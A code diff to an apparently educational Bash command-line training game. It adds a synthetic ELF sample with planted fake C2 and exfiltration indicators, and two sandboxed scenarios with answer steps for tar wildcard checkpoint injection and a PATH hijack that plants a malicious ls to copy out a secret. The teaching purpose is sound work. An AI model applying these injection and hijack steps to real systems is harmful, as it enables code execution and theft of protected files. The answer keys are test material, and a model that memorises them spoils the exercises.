@@ -13,7 +13,7 @@
 #   MANPAGES & EXP .... inline manpage data, explain() renderer
 #   QUESTION DSL ...... _qparse, format docs
 #   LEVEL GENERATORS .. gen_level1–30 (question content)
-#   SCENARIOS ......... 11 sc_setup/sc_steps functions
+#   SCENARIOS ......... 13 sc_setup/sc_steps functions
 #   ANSWER CHECK ...... _fnorm, check, load/save
 #   SCORING & UI ...... _hash, norm, stats, hdr, qdisp, draw
 #   VI HANDLER ........ _vi_normal, _read_line (shared input)
@@ -169,7 +169,7 @@ _strip_ansi() {
   REPLY="$out"
 }
 
-VERSION="1.4.1"
+VERSION="1.5.0"
 SANDBOX_TIMEOUT=5      # Seconds before sandbox command times out
 BOSS_THRESHOLD=4       # Correct answers needed to beat boss (out of BOSS_TOTAL)
 BOSS_TOTAL=5           # Number of questions in boss round
@@ -377,11 +377,11 @@ LEVEL_NAMES=("" "First Steps" "File Basics" "Save Your Work" "Reading Files" "Ba
   "Advanced Regex" "Git" "Network Tools" "Network Scanning" "WiFi & RF"
   "Hash Cracking" "Forensics" "Privilege Escalation" "ROOT")
 
-SC_TOTAL=11
+SC_TOTAL=13
 SC_NAMES=("" "Permission Lockout" "Archive & Extract" "Find the Needle" "Messy CSV"
   "The Incident" "The Broken Deploy" "Log Emergency" "Config Surgery"
-  "Git Rescue" "Batch Refactor" "Forensic Sweep")
-SC_UNLOCK=("" 13 13 16 18 18 21 21 21 23 21 22)  # boss level needed to unlock each scenario
+  "Git Rescue" "Batch Refactor" "Forensic Sweep" "Wildcard Backup" "PATH Hijack")
+SC_UNLOCK=("" 13 13 16 18 18 21 21 21 23 21 22 29 29)  # boss level needed to unlock each scenario
 SC_FLAVOR=(""
   "Everything is locked down. Restore access."
   "Package it up, ship it out, bring it back."
@@ -393,7 +393,9 @@ SC_FLAVOR=(""
   "The config file is a mess. Perform surgery."
   "Bad commit hit main. Rewind, branch, fix, tag."
   "Rename, replace, archive - a legacy tree in one sweep."
-  "An IP keeps hitting the box. Build the case from the logs.")
+  "An IP keeps hitting the box. Build the case from the logs."
+  "A backup job archives a writable dir with tar *. Turn that into code execution."
+  "A job calls a command by bare name. Own its PATH and read the secret.")
 
 _victory() {
   printf '%s\e[2J\e[H' "$_SY"
@@ -495,7 +497,7 @@ _boss_splash() {
 SANDBOX_MODE=1  # ON by default
 SANDBOX_PRISTINE="$DATA/sandbox.pristine"
 SANDBOX_DIR="$DATA/sandbox"
-_SANDBOX_GEN=4  # fixture generation - bump to force a pristine rebuild on existing installs
+_SANDBOX_GEN=5  # fixture generation - bump to force a pristine rebuild on existing installs
 _GEN_CHAINS_TMP=""  # live gen_chains temp dir, reaped by _cleanup if a signal interrupts it
 
 _BWRAP_FLAG="$DATA/.bwrap_blocked"
@@ -730,6 +732,21 @@ _gen_sandbox_files() {
     'class TestUtils(unittest.TestCase):' '    def test_helper(self):' \
     '        self.assertEqual(helper(2), 4)' '' 'if __name__ == "__main__":' \
     '    unittest.main()' > "$dir/src/test/test_utils.py"
+
+  # samples/target.bin — a synthetic, byte-identical-everywhere ELF64 sample. A hand-built
+  # 64-byte ELF header (valid enough for readelf -h / objdump -f) followed by a deterministic
+  # IOC payload. Synthesised (not copied from a host binary) so the fixture is identical on
+  # Linux/macOS/BSD — the date-seeded daily gauntlet stays "same run for everyone". IOC tokens
+  # are collision-free (flag{}, the .evil.test TLD, an sk_live_ key) so `grep -a`/`strings`
+  # yields exactly the planted value; the base64 blob decodes to "secret:hunter2".
+  mkdir -p "$dir/samples"
+  printf '\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$dir/samples/target.bin"
+  printf '%s\n' \
+    'flag{str1ngs_pull_the_truth}' \
+    'beacon-host: c2.evil.test' \
+    'exfil-mail: operator@evil.test' \
+    'API_KEY=sk_live_deadbeefcafe1234' \
+    'blob: c2VjcmV0Omh1bnRlcjI=' >> "$dir/samples/target.bin"
 }
 
 _sandbox_init() {
@@ -1141,7 +1158,7 @@ declare -A MANPAGE=(
   [mkdir]=$'make directories\n  \e[36m-p\e[0m        create parents\n  \e[2mmkdir newdir    mkdir -p path/to/dir\e[0m'
   [tree]=$'directory tree\n  \e[36m-L\e[0m \e[33mN\e[0m      depth limit\n  \e[2mtree    tree -L 2\e[0m'
   [tee]=$'copy stdin to file AND stdout\n  \e[36m-a\e[0m        append (don\x27t overwrite)\n  \e[35mvs >>\e[0m     >> sends to file only (terminal goes dark)\n          tee sends to file AND keeps output on screen\n  \e[2mecho hello | tee file.txt    ls | tee -a log.txt\e[0m'
-  [grep]=$'search text patterns\n  \e[36m-r\e[0m        recursive              \e[36m-R\e[0m        recursive (follow symlinks)\n  \e[36m-i\e[0m        ignore case            \e[36m-n\e[0m        line numbers\n  \e[36m-c\e[0m        count matches          \e[36m-l\e[0m        files only\n  \e[36m-L\e[0m        files with NO match    \e[36m-v\e[0m        invert match\n  \e[36m-o\e[0m        matched text only      \e[36m-q\e[0m        quiet (exit code)\n  \e[36m-w\e[0m        whole word             \e[36m-x\e[0m        whole line\n  \e[36m-E\e[0m        extended regex (+?|)   \e[36m-F\e[0m        literal string\n  \e[36m-P\e[0m        perl regex (\\d \\w lookahead)\n  \e[36m-f\e[0m \e[33mFILE\e[0m   patterns from file     \e[36m-A\e[0m \e[33mN\e[0m      lines after\n  \e[36m-B\e[0m \e[33mN\e[0m      lines before           \e[36m-m\e[0m \e[33mN\e[0m      max matches\n  \e[36m-C\e[0m \e[33mN\e[0m      context lines\n  \e[36m--include\e[0m  file pattern           \e[36m--exclude-dir\e[0m  skip directory\n  \e[35mvs rg\e[0m     grep is POSIX (everywhere). rg is faster, skips .gitignore,\n          recurses by default. use grep for portability, rg for speed\n  \e[2mgrep -rn TODO .    grep -ri pattern file    grep -oE \x27[0-9]+\x27 log\e[0m'
+  [grep]=$'search text patterns\n  \e[36m-r\e[0m        recursive              \e[36m-R\e[0m        recursive (follow symlinks)\n  \e[36m-i\e[0m        ignore case            \e[36m-n\e[0m        line numbers\n  \e[36m-c\e[0m        count matches          \e[36m-l\e[0m        files only\n  \e[36m-L\e[0m        files with NO match    \e[36m-v\e[0m        invert match\n  \e[36m-o\e[0m        matched text only      \e[36m-q\e[0m        quiet (exit code)\n  \e[36m-w\e[0m        whole word             \e[36m-x\e[0m        whole line\n  \e[36m-E\e[0m        extended regex (+?|)   \e[36m-F\e[0m        literal string\n  \e[36m-P\e[0m        perl regex (\\d \\w lookahead)   \e[36m-a\e[0m        treat binary as text\n  \e[36m-f\e[0m \e[33mFILE\e[0m   patterns from file     \e[36m-A\e[0m \e[33mN\e[0m      lines after\n  \e[36m-B\e[0m \e[33mN\e[0m      lines before           \e[36m-m\e[0m \e[33mN\e[0m      max matches\n  \e[36m-C\e[0m \e[33mN\e[0m      context lines\n  \e[36m--include\e[0m  file pattern           \e[36m--exclude-dir\e[0m  skip directory\n  \e[35mvs rg\e[0m     grep is POSIX (everywhere). rg is faster, skips .gitignore,\n          recurses by default. use grep for portability, rg for speed\n  \e[2mgrep -rn TODO .    grep -ri pattern file    grep -oE \x27[0-9]+\x27 log\e[0m'
   [rg]=$'fast grep (ripgrep)\n  \e[36m-i\e[0m        ignore case            \e[36m-v\e[0m        invert match\n  \e[36m-n\e[0m        line numbers           \e[36m-c\e[0m        count matches\n  \e[36m-l\e[0m        files only             \e[36m-o\e[0m        matched text only\n  \e[36m-q\e[0m        quiet (exit code)      \e[36m-w\e[0m        whole word\n  \e[36m-x\e[0m        whole line             \e[36m-F\e[0m        literal string\n  \e[36m-f\e[0m \e[33mFILE\e[0m   patterns from file     \e[36m-t\e[0m \e[33mTYPE\e[0m   file type filter\n  \e[36m-g\e[0m \e[33mGLOB\e[0m   file glob filter       \e[36m-m\e[0m \e[33mN\e[0m      max matches\n  \e[36m-A\e[0m \e[33mN\e[0m      lines after            \e[36m-B\e[0m \e[33mN\e[0m      lines before\n  \e[36m-C\e[0m \e[33mN\e[0m      context lines\n  \e[36m--no-ignore\e[0m  ignore .gitignore    \e[36m--hidden\e[0m  search dotfiles too\n  \e[36m--json\e[0m       machine-readable matches\n  \e[35mvs grep\e[0m   rg is faster, recursive by default, skips .gitignore.\n          grep is POSIX (works on any machine). use rg locally, grep in scripts\n  \e[2mrg pattern    rg -i todo    rg -t py import    rg --no-ignore --hidden x\e[0m'
   [find]=$'search for files\n  \e[36m-name\e[0m \e[33m\x27X\x27\e[0m   filename             \e[36m-iname\e[0m     case-insensitive\n  \e[36m-type\e[0m \e[33mf/d/l\e[0m  file type           \e[36m-size\e[0m \e[33m+10M\e[0m  by size\n  \e[36m-mtime\e[0m \e[33m-7\e[0m   modified days        \e[36m-mmin\e[0m \e[33m-60\e[0m   modified mins\n  \e[36m-empty\e[0m        empty files        \e[36m-executable\e[0m    has exec bit\n  \e[36m-perm\e[0m \e[33m-4000\e[0m  by permission       \e[36m-maxdepth\e[0m \e[33mN\e[0m   limit depth\n  \e[36m-path\e[0m \e[33m\x27X\x27\e[0m   match path           \e[36m-not\e[0m          negate\n  \e[36m-writable\e[0m   writable by me       \e[36m-nouser\e[0m \e[36m-nogroup\e[0m  orphaned\n  \e[36m-newermt\e[0m \e[33mDATE\e[0m  changed since   \e[36m-printf\e[0m \e[33mFMT\e[0m  custom out (\e[33m%f\e[0m name)\n  \e[36m-o\e[0m  or (predicates AND by default)   \e[36m-quit\e[0m  stop at the first hit\n  \e[36m-print0\e[0m       null delimit\n  \e[36m-exec\e[0m \e[33mCMD {} \\;\e[0m  run per file  \e[36m-exec\e[0m \e[33mCMD {} +\e[0m   batch (faster)\n  \e[36m-delete\e[0m        remove\n  \e[35mvs fd\e[0m     find is POSIX (everywhere, complex predicates). fd is faster,\n          uses regex, skips .gitignore. use find for scripts, fd for speed\n  \e[2mfind . -name "*.log"    find / -size +100M    find . -type f -empty\e[0m'
   [fd]=$'fast find\n  \e[36m-e\e[0m \e[33mEXT\e[0m    file extension         \e[36m-t\e[0m \e[33mTYPE\e[0m   f/d/l/x/e\n  \e[36m-d\e[0m \e[33mN\e[0m      max depth              \e[36m-E\e[0m \e[33mPAT\e[0m    exclude pattern\n  \e[36m-H\e[0m        include hidden         \e[36m-i\e[0m        ignore case\n  \e[36m-S\e[0m \e[33mSIZE\e[0m   by size (+/-N)         \e[36m-l\e[0m        long listing\n  \e[36m-p\e[0m        match full path        \e[36m-g\e[0m        glob pattern\n  \e[36m-x\e[0m \e[33mCMD\e[0m    execute per result\n  \e[36m--changed-within\e[0m \e[33mT\e[0m               \e[36m--changed-before\e[0m \e[33mT\e[0m\n  \e[35mvs find\e[0m   fd is faster, regex by default, skips .gitignore + hidden.\n          find is POSIX (works anywhere), has -exec {} +, -delete, complex logic\n  \e[2mfd pattern    fd -e py    fd -t d    fd -S +10M    fd -x rm {}\e[0m'
@@ -1176,6 +1193,7 @@ declare -A MANPAGE=(
   [iptables]=$'firewall rules\n  \e[36m-A\e[0m \e[33mCHAIN\e[0m  append rule            \e[36m-I\e[0m \e[33mCHAIN\e[0m  insert at top\n  \e[36m-L\e[0m        list rules             \e[36m-F\e[0m        flush all\n  \e[36m-X\e[0m        delete chains          \e[36m-j\e[0m \e[33mTARGET\e[0m ACCEPT/DROP/REJECT\n  \e[36m-p\e[0m \e[33mPROTO\e[0m  tcp/udp                \e[36m-s\e[0m \e[33mIP\e[0m     source address\n  \e[36m-m\e[0m \e[33mMOD\e[0m    match module           \e[36m-n\e[0m        numeric output\n  \e[36m-v\e[0m        verbose                \e[36m--dport\e[0m \e[33mPORT\e[0m  destination port\n  \e[36m-m connlimit --connlimit-above\e[0m \e[33mN\e[0m   more than N conns from one IP\n  \e[2miptables -A INPUT -s IP -j DROP  iptables -I INPUT -p tcp --dport 80 -j ACCEPT\e[0m'
   [eza]=$'modern ls replacement\n  \e[36m-l\e[0m        details (perms, owner, size, date)\n  \e[36m-a\e[0m        show hidden\n  \e[36m-h\e[0m        column headers         \e[36m-R\e[0m        recursive\n  \e[36m-T\e[0m        tree view              \e[36m-L\e[0m \e[33mN\e[0m      tree depth\n  \e[36m-D\e[0m        dirs only              \e[36m-r\e[0m        reverse sort\n  \e[36m--sort\e[0m \e[33mFIELD\e[0m  sort by field\n  \e[35mvs ls\e[0m     eza has git integration, color, tree built-in.\n          ls is POSIX/everywhere and scriptable\n  \e[2meza -la    eza -T -L 2    eza --sort size\e[0m'
   [xxd]=$'hex dump\n  \e[36m-p\e[0m        plain hex (no addr)    \e[36m-r\e[0m        reverse (hex to bin)\n  \e[2mxxd file    xxd -p file    echo hex | xxd -r -p\e[0m'
+  [hexdump]=$'hex + ASCII dump\n  \e[36m-C\e[0m        canonical (hex + ASCII)  \e[36m-n\e[0m \e[33mN\e[0m      only first N bytes\n  \e[35mvs xxd\e[0m    hexdump -C ≈ xxd; hexdump is POSIX-ish, xxd ships with vim\n  \e[2mhexdump -C file    hexdump -C -n 32 file\e[0m'
   [strings]=$'extract text from binary\n  \e[36m-n\e[0m \e[33mN\e[0m      minimum length         \e[36m-e\e[0m \e[33mENC\e[0m    encoding (l=UTF-16LE)\n  \e[2mstrings binary    strings -n 10 binary    strings -e l binary\e[0m'
   [readelf]=$'ELF binary inspector\n  \e[36m-h\e[0m        file header            \e[36m-s\e[0m        symbols\n  \e[36m-a\e[0m        all info\n  \e[2mreadelf -h binary    readelf -s binary    readelf -a binary\e[0m'
   [binwalk]=$'binary analysis\n  \e[36m-e\e[0m        extract embedded       \e[36m-E\e[0m        entropy analysis\n  \e[2mbinwalk binary    binwalk -e binary    binwalk -E binary\e[0m'
@@ -2930,12 +2948,12 @@ gen_level24() {
   questions+=("Pretty print JSON file§jq '.' data/export.json§jq . data/export.json§python3 -m json.tool data/export.json§jq '.' < data/export.json§jq . < data/export.json§cat data/export.json | jq '.'§cat data/export.json | jq .")
   questions+=("Extract '${key}' array from JSON§jq '.${key}' data/export.json§jq '.${key}' < data/export.json§cat data/export.json | jq '.${key}'")
   questions+=("Extract first item from '${key}' array§jq '.${key}[0]' data/export.json§jq '.${key}[0]' < data/export.json§cat data/export.json | jq '.${key}[0]'")
-  questions+=("Extract 'name' field from each item in '${key}' array§jq '.${key}[] | .name' data/export.json§jq '.${key}[] | .name' < data/export.json§jq '.${key}[].name' data/export.json")
-  questions+=("Filter items in '${key}' where status is 'active'§jq '.${key}[] | select(.status == \"active\")' data/export.json§jq '.${key}[] | select(.status==\"active\")' data/export.json§jq '[.${key}[] | select(.status == \"active\")]' data/export.json")
-  questions+=("Count items in '${key}' array§jq '.${key} | length' data/export.json§jq '.${key} | length' < data/export.json§jq '.${key}|length' data/export.json")
-  questions+=("Get keys of JSON object§jq 'keys' data/export.json§jq 'keys' < data/export.json§jq '. | keys' data/export.json")
+  questions+=("Extract 'name' field from each item in '${key}' array§jq '.${key}[] | .name' data/export.json§jq '.${key}[] | .name' < data/export.json§jq '.${key}[].name' data/export.json#output:@4")
+  questions+=("Filter items in '${key}' where status is 'active'§jq '.${key}[] | select(.status == \"active\")' data/export.json§jq '.${key}[] | select(.status==\"active\")' data/export.json§jq '[.${key}[] | select(.status == \"active\")]' data/export.json#output:~Item Three")
+  questions+=("Count items in '${key}' array§jq '.${key} | length' data/export.json§jq '.${key} | length' < data/export.json§jq '.${key}|length' data/export.json#output:4")
+  questions+=("Get keys of JSON object§jq 'keys' data/export.json§jq 'keys' < data/export.json§jq '. | keys' data/export.json#output:~metadata")
   questions+=("Compact JSON (remove whitespace)|jq -c '.' data/export.json|jq --compact-output '.' data/export.json")
-  questions+=("Raw string output (no quotes) for '.${key}[0].name'§jq -r '.${key}[0].name' data/export.json§jq --raw-output '.${key}[0].name' data/export.json")
+  questions+=("Raw string output (no quotes) for '.${key}[0].name'§jq -r '.${key}[0].name' data/export.json§jq --raw-output '.${key}[0].name' data/export.json#output:Item One")
   questions+=("Create new {name, id} object from each '${key}' item§jq '.${key}[] | {name: .name, id: .id}' data/export.json§jq '.${key}[] | {name: .name, id: .id}' < data/export.json§cat data/export.json | jq '.${key}[] | {name: .name, id: .id}'")
   questions+=("Fetch ${W}${url}${C}/api and extract '${key}' array with ${Y}jq${C}§curl -s ${url}/api | jq '.${key}'§curl --silent ${url}/api | jq '.${key}'§curl -sL ${url}/api | jq '.${key}'§curl -Ls ${url}/api | jq '.${key}'§wget -qO- ${url}/api | jq '.${key}'")
   questions+=("GET request to ${W}${url}${C}|curl ${url}|curl -s ${url}|wget -qO- ${url}")
@@ -3141,6 +3159,16 @@ gen_level27() {
 # Level 28: Forensics
 gen_level28() {
   local -n questions=${1:-CURRENT_QUESTIONS}; questions=(); eval "local $_QV"; _ctx
+  # IOC extraction from a REAL sample (samples/target.bin) — graded on exact real output when
+  # the tool is installed, text-match fallback otherwise. Planted tokens are collision-free
+  # (flag{}, .evil.test, sk_live_) so a grep yields exactly the planted value; ELF-structure
+  # answers grade on universal, arch-agnostic output via regex.
+  questions+=("Pull the ${Y}flag{...}${C} string out of ${W}samples/target.bin${C}§strings samples/target.bin | grep -oE 'flag\\{[^}]+\\}'§strings -a samples/target.bin | grep -oE 'flag\\{[^}]+\\}'§strings samples/target.bin | grep -oP 'flag\\{[^}]+\\}'#output:flag{str1ngs_pull_the_truth}")
+  questions+=("Find the exfil domain (the ${W}.evil.test${C} host) in ${W}samples/target.bin${C}§strings samples/target.bin | grep -oE '[a-z0-9.]+\\.evil\\.test'§strings -a samples/target.bin | grep -oE '[a-z0-9.]+\\.evil\\.test'§strings samples/target.bin | grep -oP '[a-z0-9.]+\\.evil\\.test'#output:c2.evil.test")
+  questions+=("Find the exfil email address in ${W}samples/target.bin${C}§strings samples/target.bin | grep -oE '[a-z]+@evil\\.test'§strings -a samples/target.bin | grep -oE '[a-z]+@evil\\.test'§strings samples/target.bin | grep -oP '[a-z]+@evil\\.test'#output:operator@evil.test")
+  questions+=("Recover the leaked API key (${W}sk_live_...${C}) from ${W}samples/target.bin${C}§strings samples/target.bin | grep -oE 'sk_live_[0-9a-f]+'§strings -a samples/target.bin | grep -oE 'sk_live_[0-9a-f]+'§strings samples/target.bin | grep -oP 'sk_live_[0-9a-f]+'#output:sk_live_deadbeefcafe1234")
+  questions+=("Confirm ${W}samples/target.bin${C} is an ELF (its magic bytes)§hexdump -C samples/target.bin | head -1§xxd samples/target.bin | head -1§readelf -h samples/target.bin§file samples/target.bin#output:~(7f ?45 ?4c ?46|ELF)")
+  questions+=("Show the ELF class (32/64-bit) of ${W}samples/target.bin${C}|readelf -h samples/target.bin|objdump -f samples/target.bin|readelf --file-header samples/target.bin#output:~(ELF64|ELF32|elf64|elf32)")
   questions+=("Extract ASCII strings from ${W}${bin}${C}|strings ${bin}|strings -a ${bin}|strings --all ${bin}")
   questions+=("Extract strings minimum 10 chars in ${W}${bin}${C}|strings -n 10 ${bin}|strings --bytes=10 ${bin}|strings --bytes 10 ${bin}")
   questions+=("Extract Unicode strings (Windows binaries) in ${W}${bin}${C}|strings -e l ${bin}|strings --encoding=l ${bin}|strings --encoding l ${bin}")
@@ -3487,6 +3515,22 @@ gen_chains() {
   local _codes=(200 404 500); local _code=${_codes[RANDOM%3]}  # RANDOM (not shuf) so a seeded run is reproducible
   _chq "traffic.log: how many requests returned status $_code" \
        "awk '\$9==$_code' traffic.log | wc -l" traffic.log
+
+  # ── samples/target.bin (forensic sample) ──
+  # IOC extraction from a real binary under the clock. The fixture is byte-identical on every
+  # OS (synthesised ELF), and grep -a / base64 are universal, so these stay reproducible for
+  # the date-seeded daily. #output is DERIVED (any correct pipeline that yields the IOC passes).
+  _chq "target.bin: the flag{...} string hidden in the sample" \
+       "grep -aoE 'flag\\{[^}]+\\}' samples/target.bin" target.bin
+  _chq "target.bin: the exfil domain (the .evil.test host)" \
+       "grep -aoE '[a-z0-9.]+\\.evil\\.test' samples/target.bin" target.bin
+  _chq "target.bin: the exfil email address" \
+       "grep -aoE '[a-z]+@evil\\.test' samples/target.bin" target.bin
+  _chq "target.bin: the leaked API key (sk_live_...)" \
+       "grep -aoE 'sk_live_[0-9a-f]+' samples/target.bin" target.bin
+  _chq "target.bin: the base64 blob, DECODED" \
+       "grep -aoE 'c2[A-Za-z0-9+/=]{6,}' samples/target.bin | base64 -d" target.bin
+
   rm -rf "$_t"; _GEN_CHAINS_TMP=""
 }
 
@@ -3780,6 +3824,48 @@ Save all 10.0.0.99 lines to attacker.log§grep '10.0.0.99' server.log > attacker
 Count failed 401 logins from the attacker§grep 10.0.0.99 server.log | grep -c ' 401 '§grep '10.0.0.99' server.log | grep -c ' 401 '§awk '$1=="10.0.0.99" && /401/' server.log | wc -l§awk '/10\.0\.0\.99/ && /401/' server.log | wc -l§rg 10.0.0.99 server.log | rg -c ' 401 '#output:5
 Show the attacker's successful (200) requests§grep 10.0.0.99 server.log | grep ' 200 '§awk '$1=="10.0.0.99" && /200/' server.log§awk '/10\.0\.0\.99/ && / 200 /' server.log§rg 10.0.0.99 server.log | rg ' 200 '#output:~/admin
 Extract distinct URLs the attacker hit, sorted§awk '$1=="10.0.0.99" {print $7}' server.log | sort -u§awk '$1=="10.0.0.99" {print $7}' server.log | sort | uniq§grep 10.0.0.99 server.log | awk '{print $7}' | sort -u§grep 10.0.0.99 server.log | awk '{print $7}' | sort | uniq§rg 10.0.0.99 server.log | awk '{print $7}' | sort -u#output:~/admin
+STEPS
+}
+
+# --- Scenario 12: Wildcard Backup (tar checkpoint injection) ---
+# The exploit's EFFECT is real (tar genuinely runs the injected command in the sandbox); the
+# "privilege" is simulated — everything runs as the sandbox user, no real uid-0 is granted.
+_sc_setup_12() {
+  local d=$1
+  mkdir -p "$d/share"
+  printf 'public data\n' > "$d/share/notes.txt"
+  printf 'quarterly numbers\n' > "$d/share/report.txt"
+  # The "scheduled backup": archives share/ with an unquoted wildcard — the vulnerability.
+  printf '%s\n' '#!/bin/bash' '# nightly backup job' 'cd /sandbox/share && tar czf /sandbox/backup.tar.gz *' > "$d/backup.sh"
+  chmod +x "$d/backup.sh"
+}
+_sc_steps_12() {
+  cat <<'STEPS'
+Read the scheduled backup script to see how it archives§cat backup.sh§head -5 backup.sh§less backup.sh§more backup.sh§head backup.sh#output:~tar czf
+Plant the injection in share/: a runme.sh that runs id, plus tar's two checkpoint trigger files§cd share && printf 'id > pwned\n' > runme.sh && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh runme.sh'§cd share && printf 'id >> pwned\n' > runme.sh && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh runme.sh'§cd share && echo 'id > pwned' > runme.sh && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh runme.sh'#state:exists:share/runme.sh,exists:share/--checkpoint=1
+Trigger the backup so tar hits your checkpoint files§bash backup.sh§./backup.sh§sh backup.sh§. backup.sh#state:exists:share/pwned
+Confirm your injected command ran — read its output§cat share/pwned§head -5 share/pwned§head share/pwned§head -n 1 share/pwned#output:~uid=
+STEPS
+}
+
+# --- Scenario 13: PATH Hijack ---
+# Real effect (the planted binary genuinely runs and exfiltrates the file); privilege is
+# simulated — the "secret" is same-user readable, the point is the hijack mechanism.
+_sc_setup_13() {
+  local d=$1
+  mkdir -p "$d/reports"
+  printf 'flag{path_hijack_pwned}\n' > "$d/root_secret.txt"
+  printf 'stale\n' > "$d/reports/latest.txt"
+  # A "monitoring" job that calls ls by bare name — resolvable via a hijacked PATH.
+  printf '%s\n' '#!/bin/bash' '# health monitor' 'cd /sandbox/reports && ls > /sandbox/reports/latest.txt' > "$d/monitor.sh"
+  chmod +x "$d/monitor.sh"
+}
+_sc_steps_13() {
+  cat <<'STEPS'
+Read monitor.sh — notice it runs a command by bare name (no full path)§cat monitor.sh§head -5 monitor.sh§less monitor.sh§more monitor.sh§head monitor.sh#output:~ls
+Plant a malicious ls in a new bin/ dir that copies the secret to /sandbox/loot§mkdir -p bin && printf 'cat /sandbox/root_secret.txt > /sandbox/loot\n' > bin/ls && chmod +x bin/ls§mkdir -p bin && printf 'cat /sandbox/root_secret.txt >> /sandbox/loot\n' > bin/ls && chmod +x bin/ls§mkdir bin && printf 'cat /sandbox/root_secret.txt > /sandbox/loot\n' > bin/ls && chmod +x bin/ls#state:exists:bin/ls,perm:bin/ls:x
+Run monitor.sh with your bin/ first on PATH so its bare ls resolves to yours§PATH=/sandbox/bin:$PATH bash monitor.sh§PATH=/sandbox/bin:$PATH ./monitor.sh§PATH=/sandbox/bin:$PATH sh monitor.sh#state:exists:loot
+Read the exfiltrated secret§cat loot§head -5 loot§cat /sandbox/loot§head loot§head -n 1 loot#output:~path_hijack_pwned
 STEPS
 }
 
@@ -5489,7 +5575,7 @@ _sel() {
     read -rsn1 k
     if [[ "$k" == $'\e' ]]; then
       read -rsn2 -t 0.1 k
-      if [[ -z "$k" ]]; then ((_SEL_BACK)) && return 1; continue; fi
+      if [[ -z "$k" ]]; then return 1; fi  # bare esc: quit top menu / back out of a submenu
       ((${#k} < 2)) && continue
       k="${k:1}"
       # Only arrows may fall through. Multi-byte CSI keys (Del \e[3~, PgDn \e[6~,
@@ -5507,7 +5593,7 @@ _sel() {
       j|B) local _p=$((c+1)); while ((_p<n)) && [[ "${it[$_p]:0:1}" == $'\x01' ]]; do ((_p++)); done; ((_p<n)) && c=$_p;;
       k|A) local _p=$((c-1)); while ((_p>=0)) && [[ "${it[$_p]:0:1}" == $'\x01' ]]; do ((_p--)); done; ((_p>=0)) && c=$_p;;
       ''|l|C) REPLY=$c; return 0;;
-      $'\x04') return 1;;
+      $'\x04'|q) return 1;;  # ctrl-d / q: quit top menu, back out of a submenu
       h|D) ((_SEL_BACK)) && return 1;;
       *) continue;;
     esac
@@ -5562,6 +5648,9 @@ _main_menu() {
     else _tl_text="${D}${_GSH}${_GS2}${_GS3}${_GBK} MASTER THE COMMAND LINE ${_GBK}${_GS3}${_GS2}${_GSH}${N}" _tl_w=33; fi
     printf -v _tl_pad '%*s' $(( (71 - _tl_w) / 2 )) ''
     _tagline="${_tl_pad}${_tl_text}"
+    # controls hint (Quit is a key, not a row), centered under the 71-wide banner
+    local _hint_pad; printf -v _hint_pad '%*s' $(( (71 - 30) / 2 )) ''
+    _tagline="${_tagline}"$'\n'"${_hint_pad}${D}j/k move · enter select · q quit${N}"
     local _n=1
     if [[ -n "$PLAYER_NAME" ]] && ((LVL>1||QI>0)); then
       it+=("$((_n++)) Continue  ${D}Level $LVL Q$((QI+1))${N}"); act+=(cont)
@@ -5583,13 +5672,12 @@ _main_menu() {
     else it+=($'\x01'"$((_n++)) Practice"); act+=(x); fi
     if ((SANDBOX_MODE)); then it+=("$((_n++)) Playground"); act+=(play)
     else it+=($'\x01'"$((_n++)) Playground (needs sandbox)"); act+=(x); fi
-    # The tail rows are not game modes, so they take mnemonic letters instead of
-    # continuing the numbering. Keeps every row a single keypress - a "10" hotkey
-    # can't work in a read -rsn1 menu - and separates play from meta at a glance.
-    if [[ -n "$PLAYER_NAME" ]]; then it+=("s Stats"); act+=(stats)
-    else it+=($'\x01'"s Stats"); act+=(x); fi
-    it+=("o Options"); act+=(opts)
-    it+=("q Quit"); act+=(quit)
+    # Stats/Options continue the numbering (every row is a digit hotkey; the list is
+    # capped at 9 rows so a single read -rsn1 keypress always works). Quit is not a row —
+    # q / esc / ctrl-d exit from the top menu (hint shown under the banner).
+    if [[ -n "$PLAYER_NAME" ]]; then it+=("$((_n++)) Stats"); act+=(stats)
+    else it+=($'\x01'"$((_n++)) Stats"); act+=(x); fi
+    it+=("$((_n++)) Options"); act+=(opts)
     local _banner
     if ((_CAP_UNI)); then
       printf -v _banner '%s\n%s\n%s\n%s\n%s\n%s\n\n%s' \
@@ -5637,7 +5725,6 @@ _main_menu() {
       sc) _sc_sel;;
       challenge) challenge;;
       opts) _options_menu;;
-      quit) _CLEANING=1; exit 0;;
       stats) printf '%s\e[2J\e[H' "$_SY"; stats; printf '%s' "$_SN"; local _sk; while read -rsn1 _sk; do
         [[ "$_sk" == h || "$_sk" == q || -z "$_sk" ]] && break
         [[ "$_sk" == $'\e' ]] && { read -rsn2 -t 0.1 _sk; [[ "${_sk:1}" == D ]] && break; [[ -z "$_sk" ]] && break; }
